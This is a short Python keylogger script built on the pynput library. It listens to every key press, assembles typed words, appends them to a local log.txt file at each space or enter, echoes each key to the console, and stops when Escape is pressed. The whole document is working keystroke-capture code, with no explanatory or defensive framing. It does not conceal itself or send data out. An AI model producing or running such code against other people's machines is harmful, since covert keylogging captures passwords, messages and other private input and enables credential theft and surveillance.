from pynput.keyboard import Key, Listener

keys = []  # Buffer for accumulating characters
current_word = ""  # Track current word being typed

def write_to_log(text):
    with open("log.txt", "a") as f:
        f.write(text)

def on_press(key):
    global current_word

    try:
        # Regular alphanumeric key
        if hasattr(key, 'char') and key.char is not None:
            current_word += key.char
            print(f"Key pressed: {key.char}")

        elif key == Key.space:
            # Finalize word with a space
            if current_word:
                write_to_log(current_word + " ")
                print(f"Word logged: {current_word} ")
                current_word = ""
            else:
                write_to_log(" ")  # Standalone space
                print("Key pressed: [space]")

        elif key == Key.enter:
            # Finalize line
            if current_word:
                write_to_log(current_word + "\n")
                print(f"Line logged: {current_word}")
                current_word = ""
            else:
                write_to_log("\n")
                print("Key pressed: [enter]")

        elif key == Key.backspace:
            # Simulate backspace in word
            current_word = current_word[:-1]
            print("Key pressed: [backspace]")

        else:
            # For other special keys, log as needed
            print(f"Key pressed: {key}")

    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    if key == Key.esc:  # Stop listener with ESC
        return False

# Start the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()